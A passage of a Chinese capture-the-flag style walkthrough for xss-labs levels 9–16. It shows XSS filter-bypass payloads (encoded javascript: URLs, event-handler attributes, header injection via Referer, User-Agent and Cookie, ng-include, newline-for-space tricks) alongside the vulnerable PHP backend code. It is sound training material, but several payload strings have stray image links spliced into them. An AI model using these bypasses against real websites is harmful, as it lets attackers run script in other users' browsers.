+<p>那我们先尝试一下<code>javascript:alert()http://www.baidu.com</code>但是这首先就不符合语法，应该在 http 前面加注释，（反正不执行，后端只是检测一下有没有这个字样）所以我们应该改成<code>javascript: alert(1) //http://ww![2](./xss-labs/9/2.jpg)w.baidu.com</code><img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/2-1706708157743-38.jpg" /></p>
+</li>
+<li>
+<p>但是输入之后并不行，怎么回事，看看页面源码，发现 href 中的 “ script ” 被插入了下划线<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/3.jpg" /></p>
+</li>
+<li>这应该是后端匹配到 script 然后做了替换，因为是在 href 里面，那我们就进行 Unicode 编码，（注意别把html给编码了）<code>javasc&amp;#114;ipt:alert(1)//http://</code></li>
+<li>我们看一看后端代码：</li>
+</ol>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><span class="x">  $str = strtolower($_GET[&quot;keyword&quot;]);</span>
+</span><span id="__span-7-2"><span class="x">  $str2 = str_replace(&quot;script&quot;, &quot;scr_ipt&quot;, $str);</span>
+</span><span id="__span-7-3"><span class="x">  $str3 = str_replace(&quot;on&quot;, &quot;o_n&quot;, $str2);</span>
+</span><span id="__span-7-4"><span class="x">  $str4 = str_replace(&quot;src&quot;, &quot;sr_c&quot;, $str3);</span>
+</span><span id="__span-7-5"><span class="x">  $str5 = str_replace(&quot;data&quot;, &quot;da_ta&quot;, $str4);</span>
+</span><span id="__span-7-6"><span class="x">  $str6 = str_replace(&quot;href&quot;, &quot;hr_ef&quot;, $str5);</span>
+</span><span id="__span-7-7"><span class="x">  $str7 = str_replace(&#39;&quot;&#39;, &#39;&amp;quot&#39;, $str6);</span>
+</span><span id="__span-7-8"><span class="x">  echo &#39;&lt;center&gt;</span>
+</span><span id="__span-7-9"><span class="x">&lt;form action=level9.php method=GET&gt;</span>
+</span><span id="__span-7-10"><span class="x">&lt;input name=keyword  value=&quot;&#39; . htmlspecialchars($str) . &#39;&quot;&gt;</span>
+</span><span id="__span-7-11"><span class="x">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span>
+</span><span id="__span-7-12"><span class="x">&lt;/form&gt;</span>
+</span><span id="__span-7-13"><span class="x">&lt;/center&gt;&#39;;</span>
+</span><span id="__span-7-14"><span class="x">  ?&gt;</span>
+</span><span id="__span-7-15"><span class="x">  </span><span class="cp">&lt;?php</span>
+</span><span id="__span-7-16">  <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="nb">strpos</span><span class="p">(</span><span class="nv">$str7</span><span class="p">,</span> <span class="s1">&#39;http://&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span><span id="__span-7-17">    <span class="k">echo</span> <span class="s1">&#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;</span><span class="p">;</span>
+</span><span id="__span-7-18">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span id="__span-7-19">    <span class="k">echo</span> <span class="s1">&#39;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#39;</span> <span class="o">.</span> <span class="nv">$str7</span> <span class="o">.</span> <span class="s1">&#39;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#39;</span><span class="p">;</span>
+</span><span id="__span-7-20">  <span class="p">}</span>
+</span><span id="__span-7-21">  <span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<ol>
+<li>看到了吧，使用了 strpos() 函数进行了匹配   <a href="https://www.w3school.com.cn/php/func_string_strpos.asp">点我学习 strpos() 函数</a></li>
+</ol>
+<h2 id="level-10">level-10 隐藏信息<a class="headerlink" href="#level-10" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level10.php?keyword=well done!</p>
+</blockquote>
+<ol>
+<li>我们进网页源码看一看，发现有三个 input 标签被隐藏了，但是我们不知道这三个标签哪一个可以利用，那么根据他们的name构造传值，让它们的type改变，不再隐藏，谁出来了谁就能利用， <code>t_link" type='text'&gt;//&amp;t_history" type='text'&gt;//&amp;t_sort=" type='text'&gt;//</code>试一试，发现第三个被修改了（或者是输入<code>a&amp;t_link=aa&amp;t_history=bb&amp;t_sort=cc</code>回车后发现页面源码中之后 t_sort 被改动了）
+<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/2-1706708188548-48.jpg" />
+<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/2-1706708195588-50.jpg" /></li>
+<li>那我们呢就直接构造payload：<code>&amp;t_sort=" type='text' onclick=javascript:alert(12)&gt;//</code>，成功</li>
+<li>看一看后端</li>
+</ol>
+<p><div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><span class="x">    </span><span class="cp">&lt;?php</span>
+</span><span id="__span-8-2">    <span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;display_errors&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-8-3">    <span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;keyword&quot;</span><span class="p">];</span>
+</span><span id="__span-8-4">    <span class="nv">$str11</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;t_sort&quot;</span><span class="p">];</span>
+</span><span id="__span-8-5">    <span class="nv">$str22</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;&gt;&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$str11</span><span class="p">);</span>
+</span><span id="__span-8-6">    <span class="nv">$str33</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;&lt;&quot;</span><span class="p">,</span> <span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$str22</span><span class="p">);</span>
+</span><span id="__span-8-7">    <span class="k">echo</span> <span class="s2">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;相关的结果.&lt;/h2&gt;&quot;</span> <span class="o">.</span> <span class="s1">&#39;&lt;center&gt;</span>
+</span><span id="__span-8-8"><span class="s1">&lt;form id=search&gt;</span>
+</span><span id="__span-8-9"><span class="s1">&lt;input name=&quot;t_link&quot;  value=&quot;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&quot; type=&quot;hidden&quot;&gt;</span>
+</span><span id="__span-8-10"><span class="s1">&lt;input name=&quot;t_history&quot;  value=&quot;&#39;</span> <span class="o">.</span> <span class="s1">&#39;&quot; type=&quot;hidden&quot;&gt;</span>
+</span><span id="__span-8-11"><span class="s1">&lt;input name=&quot;t_sort&quot;  value=&quot;&#39;</span> <span class="o">.</span> <span class="nv">$str33</span> <span class="o">.</span> <span class="s1">&#39;&quot; type=&quot;hidden&quot;&gt;</span>
+</span><span id="__span-8-12"><span class="s1">&lt;/form&gt;</span>
+</span><span id="__span-8-13"><span class="s1">&lt;/center&gt;&#39;</span><span class="p">;</span>
+</span><span id="__span-8-14">    <span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+4. 发现 <code>$_GET["t_sort"]</code> 经过删除尖括号等操作，最终放到了第三个 input 标签里。</p>
+<h2 id="level-11-referer">level-11 referer<a class="headerlink" href="#level-11-referer" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level11.php?keyword=good job!
+1. 我们看看页面源码，发现有四个被隐藏的 input 标签，相比于上一关多出了一个叫 t_ref 的标签，ref，有没有想到什么，当然是 referer。（并且这个标签值为第10关URL）
+Referer  是  HTTP  请求header 的一部分，当浏览器（或者模拟浏览器行为）向web 服务器发送请求的时候，头信息里有包含  Referer  。比如我在www.google.com 里有一个www.baidu.com 链接，那么点击这个www.baidu.com ，它的header 信息里就有：Referer=http://www.google.com</p>
+</blockquote>
+<p>由此可以看出来吧。它就是表示一个来源。看下图的一个请求的 Referer  信息。<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1-1706708215536-55.jpg" /></p>
+<ol>
+<li>
+<p>既然如此，那我们就试试用 Burp 抓包，然后修改 referer，呃当然是先去第十关，在弹窗成功那儿（跳转11关的时候）抓包。如图为抓到的数据包：<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/2-1706708225123-60.jpg" /></p>
+</li>
+<li>
+<p>我们将数据包修改为<code>referer:&amp;t_sort=" type='text' onclick=javascript:alert()&gt;//![3](./xss-labs/11/3.jpg)</code>，然后放行，发现页面确实有了一个框，点击成功弹窗<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/3-1706708615027-128.jpg" /></p>
+</li>
+<li>最后我们来看下后端代码：发现确实是<code>$str11 = $_SERVER['HTTP_REFERER'];</code></li>
+</ol>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><span class="x">    ini_set(&quot;display_errors&quot;, 0);</span>
+</span><span id="__span-9-2"><span class="x">    $str = $_GET[&quot;keyword&quot;];</span>
+</span><span id="__span-9-3"><span class="x">    $str00 = $_GET[&quot;t_sort&quot;];</span>
+</span><span id="__span-9-4"><span class="x">    $str11 = $_SERVER[&#39;HTTP_REFERER&#39;];</span>
+</span><span id="__span-9-5"><span class="x">    $str22 = str_replace(&quot;&gt;&quot;, &quot;&quot;, $str11);</span>
+</span><span id="__span-9-6"><span class="x">    $str33 = str_replace(&quot;&lt;&quot;, &quot;&quot;, $str22);</span>
+</span><span id="__span-9-7"><span class="x">    echo &quot;&lt;h2 align=center&gt;没有找到和&quot; . htmlspecialchars($str) . &quot;相关的结果.&lt;/h2&gt;&quot; . &#39;&lt;center&gt;</span>
+</span><span id="__span-9-8"><span class="x">&lt;form id=search&gt;</span>
+</span><span id="__span-9-9"><span class="x">&lt;input name=&quot;t_link&quot;  value=&quot;&#39; . &#39;&quot; type=&quot;hidden&quot;&gt;</span>
+</span><span id="__span-9-10"><span class="x">&lt;input name=&quot;t_history&quot;  value=&quot;&#39; . &#39;&quot; type=&quot;hidden&quot;&gt;</span>
+</span><span id="__span-9-11"><span class="x">&lt;input name=&quot;t_sort&quot;  value=&quot;&#39; . htmlspecialchars($str00) . &#39;&quot; type=&quot;hidden&quot;&gt;</span>
+</span><span id="__span-9-12"><span class="x">&lt;input name=&quot;t_ref&quot;  value=&quot;&#39; . $str33 . &#39;&quot; type=&quot;hidden&quot;&gt;</span>
+</span><span id="__span-9-13"><span class="x">&lt;/form&gt;</span>
+</span><span id="__span-9-14"><span class="x">&lt;/center&gt;&#39;;</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="level-12-user-agent">level-12 user-agent<a class="headerlink" href="#level-12-user-agent" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level12.php?keyword=good job!</p>
+</blockquote>
+<ol>
+<li>还是看页面源码，这次的又成了 t_ua ，UA，后面的值也一看就是UA，那我们启动Burp！<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1-1706708271749-65.jpg" /></li>
+<li>如图为我们抓到的数据包：<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/2-1706708280856-70.jpg" /></li>
+<li>我们对 UA 的值进行修改：<code>"type="te![3](./xss-labs/12/3.jpg)xt" onmousemove="alert()</code><img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/3-1706708295322-72.jpg" /></li>
+<li>修改后放行，成功弹窗，我们看看后端代码：（<code>$str11 = $_SERVER['HTTP_USER_AGENT'];</code>）</li>
+</ol>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><span class="x">    ini_set(&quot;display_errors&quot;, 0);</span>
+</span><span id="__span-10-2"><span class="x">    $str = $_GET[&quot;keyword&quot;];</span>
+</span><span id="__span-10-3"><span class="x">    $str00 = $_GET[&quot;t_sort&quot;];</span>
+</span><span id="__span-10-4"><span class="x">    $str11 = $_SERVER[&#39;HTTP_USER_AGENT&#39;];</span>
+</span><span id="__span-10-5"><span class="x">    $str22 = str_replace(&quot;&gt;&quot;, &quot;&quot;, $str11);</span>
+</span><span id="__span-10-6"><span class="x">    $str33 = str_replace(&quot;&lt;&quot;, &quot;&quot;, $str22);</span>
+</span><span id="__span-10-7"><span class="x">    echo &quot;&lt;h2 align=center&gt;没有找到和&quot; . htmlspecialchars($str) . &quot;相关的结果.&lt;/h2&gt;&quot; . &#39;&lt;center&gt;</span>
+</span><span id="__span-10-8"><span class="x">&lt;form id=search&gt;</span>
+</span><span id="__span-10-9"><span class="x">&lt;input name=&quot;t_link&quot;  value=&quot;&#39; . &#39;&quot; type=&quot;hidden&quot;&gt;</span>
+</span><span id="__span-10-10"><span class="x">&lt;input name=&quot;t_history&quot;  value=&quot;&#39; . &#39;&quot; type=&quot;hidden&quot;&gt;</span>
+</span><span id="__span-10-11"><span class="x">&lt;input name=&quot;t_sort&quot;  value=&quot;&#39; . htmlspecialchars($str00) . &#39;&quot; type=&quot;hidden&quot;&gt;</span>
+</span><span id="__span-10-12"><span class="x">&lt;input name=&quot;t_ua&quot;  value=&quot;&#39; . $str33 . &#39;&quot; type=&quot;hidden&quot;&gt;</span>
+</span><span id="__span-10-13"><span class="x">&lt;/form&gt;</span>
+</span><span id="__span-10-14"><span class="x">&lt;/center&gt;&#39;;</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="level-13-cookie">level-13 cookie<a class="headerlink" href="#level-13-cookie" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level13.php?keyword=good job!</p>
+</blockquote>
+<ol>
+<li>先看看前端代码，这次又换成了 t_cook ，呃，cookies？看一看 cookies ，长得确实很奇怪。那就还是 Burp 改包。<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/4.jpg" />
+<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1-1706708331819-79.jpg" /></li>
+<li>我们在Burp抓到数据包之后，将 cookie 修改为<code>"type='text' onclick=javascript:![2](./xss-labs/13/2.jpg)alert(1)//</code>，如图：<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/2-1706708343842-81.jpg" /></li>
+<li>放行后果然有了一个框，也成功弹窗。<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/3-1706708356967-86.jpg" /></li>
+<li>看看后端代码：（<code>$str11 = $_COOKIE["user"];</code>）</li>
+</ol>
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><span class="x">    setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time() + 3600);</span>
+</span><span id="__span-11-2"><span class="x">    ini_set(&quot;display_errors&quot;, 0);</span>
+</span><span id="__span-11-3"><span class="x">    $str = $_GET[&quot;keyword&quot;];</span>
+</span><span id="__span-11-4"><span class="x">    $str00 = $_GET[&quot;t_sort&quot;];</span>
+</span><span id="__span-11-5"><span class="x">    $str11 = $_COOKIE[&quot;user&quot;];</span>
+</span><span id="__span-11-6"><span class="x">    $str22 = str_replace(&quot;&gt;&quot;, &quot;&quot;, $str11);</span>
+</span><span id="__span-11-7"><span class="x">    $str33 = str_replace(&quot;&lt;&quot;, &quot;&quot;, $str22);</span>
+</span><span id="__span-11-8"><span class="x">    echo &quot;&lt;h2 align=center&gt;没有找到和&quot; . htmlspecialchars($str) . &quot;相关的结果.&lt;/h2&gt;&quot; . &#39;&lt;center&gt;</span>
+</span><span id="__span-11-9"><span class="x">&lt;form id=search&gt;</span>
+</span><span id="__span-11-10"><span class="x">&lt;input name=&quot;t_link&quot;  value=&quot;&#39; . &#39;&quot; type=&quot;hidden&quot;&gt;</span>
+</span><span id="__span-11-11"><span class="x">&lt;input name=&quot;t_history&quot;  value=&quot;&#39; . &#39;&quot; type=&quot;hidden&quot;&gt;</span>
+</span><span id="__span-11-12"><span class="x">&lt;input name=&quot;t_sort&quot;  value=&quot;&#39; . htmlspecialchars($str00) . &#39;&quot; type=&quot;hidden&quot;&gt;</span>
+</span><span id="__span-11-13"><span class="x">&lt;input name=&quot;t_cook&quot;  value=&quot;&#39; . $str33 . &#39;&quot; type=&quot;hidden&quot;&gt;</span>
+</span><span id="__span-11-14"><span class="x">&lt;/form&gt;</span>
+</span><span id="__span-11-15"><span class="x">&lt;/center&gt;&#39;;</span>
+</span></code></pre></div></td></tr></table></div>
+<h2 id="level-14-exif">level-14 exif<a class="headerlink" href="#level-14-exif" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level14.php
+1. 看了看网上，好多说这个题有问题，页面也正常显示不出来。我们就直接看看后端代码吧。</p>
+</blockquote>
+<p><div class="language-html highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">HTML</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span><span id="__span-12-2">    <span class="p">&lt;</span><span class="nt">h1</span> <span class="na">align</span><span class="o">=</span><span class="s">center</span><span class="p">&gt;</span>欢迎来到level14<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span><span id="__span-12-3">    <span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;&lt;</span><span class="nt">iframe</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;leftframe&quot;</span> <span class="na">marginwidth</span><span class="o">=</span><span class="s">10</span> <span class="na">marginheight</span><span class="o">=</span><span class="s">10</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;http://www.exifviewer.org/&quot;</span> <span class="na">frameborder</span><span class="o">=</span><span class="s">no</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;80%&quot;</span> <span class="na">scrolling</span><span class="o">=</span><span class="s">&quot;no&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">80%</span><span class="p">&gt;&lt;/</span><span class="nt">iframe</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
+</span><span id="__span-12-4">    <span class="p">&lt;</span><span class="nt">center</span><span class="p">&gt;</span>这关成功后不会自动跳转。成功者<span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">/xsschallenge/level15.php?src=1.gif</span><span class="p">&gt;</span>点我进level15<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;&lt;/</span><span class="nt">center</span><span class="p">&gt;</span>
+</span><span id="__span-12-5"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+2. （payload是一张图片马，考到了CTF中的杂项中隐写 Exif 隐藏信息）大致意思就是通过修改 iframe 调用的文件（ src ）来实现 xss 注入。上传的图片的 EXIF 中包含恶意代码，然后当图片被解析的时候，其中EXIF中的代码就会被执行。<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1-1706708369809-91.jpg" /></p>
+<ol>
+<li>去了解一下 EXIF 吧<blockquote>
+<p>exif是可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。</p>
+</blockquote>
+</li>
+</ol>
+<h2 id="level-15-ng-include">level-15 ng-include<a class="headerlink" href="#level-15-ng-include" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level15.php?src=1.gif</p>
+</blockquote>
+<ol>
+<li>我们先尝试将 url 中的 1.gif 修改为 <code>&lt;script&gt;alert()&lt;/script&gt;</code>，然后看看页面源码，发现除了有个<code>&lt;!-- ngInclude: &lt;script&gt;alert()&lt;/script&gt; --&gt;</code>也没有别的东西了，那我们就搜一搜啥是 nginclude<img alt="在这里插入图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1-1706708386607-96.jpg" /></li>
+</ol>
+<blockquote>
+<p>ng-include 指令用于包含外部的 HTML 文件。
+包含的内容将作为指定元素的子节点。
+ng-include 属性的值可以是一个表达式，返回一个文件名。
+默认情况下，包含的文件需要包含在同一个域名下。</p>
+</blockquote>
+<ol>
+<li>
+<p>那也就是说，我们只要使 ng-include 包含一个弹窗页面就行，而且“默认情况下，包含的文件需要包含在同一个域名下”。那我们就把第一关搬过来。（<code>http://127.0.0.1/xss-labs/level1.php?nam![2](./xss-labs/15/2.jpg)e=%3Cscript%3Ealert(1)%3C/script%3E</code>）<img alt="在这里插入图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/2-1706708396716-98.jpg" /></p>
+</li>
+<li>
+<p>而直接把上述内容替换 1.gif 回车后发现没有任何作用，这是因为没有加单引号，必须用单引号包围起来。
+回车后我们呢看到页面中确实有了整个第一关的东西，页面源码里面也包含了第一关的东西，但是依旧<img alt="3" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/3-1706708454118-107.jpg" />没有弹窗。<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/4-1706708481226-111.jpg" /></p>
+</li>
+<li>这种情况很可能是 script标签 被页面过滤掉了。那我们换一种方式：（注意，这里不能包涵那些直接弹窗的东西如<code>&lt;script&gt;</code>，但是可以包涵那些标签的东西比如<code>&lt;a&gt;</code>、<code>&lt;input&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;p&gt;</code>标签等等，这些标签是能需要我们手动点击弹窗的）
+方法一：<code>http://127.0.0.1/xss-labs/level1.php?name=a&lt;img src=1 onerror=alert()&gt;</code>
+方法二：<code>http://127.0.0.1/xss-labs/level1.php?name=&lt;p onmousedown=alert()&gt;AAA&lt;/p&gt;</code>
+方法三：<code>http://127.0.0.1/xss-labs/level1.php?name=&lt;a href="javascript:alert()"&gt;</code>
+等等………………</li>
+<li>看一看后端
+<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><span class="cp">&lt;?php</span>
+</span><span id="__span-13-2"><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;display_errors&quot;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span id="__span-13-3"><span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;src&quot;</span><span class="p">];</span>
+</span><span id="__span-13-4"><span class="k">echo</span> <span class="s1">&#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;</span><span class="p">;</span>
+</span><span id="__span-13-5"><span class="cp">?&gt;</span>
+</span></code></pre></div></td></tr></table></div></li>
+<li>还有就是了解一下 angular （前端框架）因为这个 ng-include 是它的东西</li>
+</ol>
+<h2 id="level-16">level-16 空格实体转义<a class="headerlink" href="#level-16" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>http://127.0.0.1/xss-labs/level16.php?keyword=test</p>
+</blockquote>
+<ol>
+<li>因为前面有 center 标签，我就想着先把它闭合掉，<code>&lt;/center&gt;&lt;script&gt;alert(![1](./xss-labs/16/1.jpg))&lt;/script&gt;</code> 但是不管是 / 还是 script 都被过滤了：<img alt="在这里插入图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/1-1706708573114-126.jpg" /></li>
+<li>那好，那我试一试上一关的<code>&lt;img src=1 onerror![2](./xss-labs/16/2.jpg)=alert()&gt;</code>，但是看起来空格也被弄了<img alt="请添加图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/2-1706708508635-113.jpg" /></li>
+</ol>
+<blockquote>
+<p>HTML提供了5种空格实体（space entity），它们拥有不同的宽度，非断行空格（<code>&amp;nbsp;</code>）是常规空格的宽度，可运行于所有主流浏览器。其他几种空格（ <code>&amp;ensp; &amp;emsp; &amp;thinsp; &amp;zwnj;&amp;zwj;</code>）在不同浏览器中宽度各异。</p>
+</blockquote>
+<ol>
+<li>既然如此，那我们就直接把 <strong>换行符</strong> 给 URL 编码一下，%0A，用 %0A 替换空格，成功弹窗。至于为什么不是用空格 URL 编码，而是用换行符 这是因为用换行符替换空格效果一样 (在 html 中，不论加多少空格或者回车，都会被转成一个空格)<img alt="在这里插入图片描述" src="../xss-labs%E9%9D%B6%E5%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/3-1706708520668-118.jpg" />
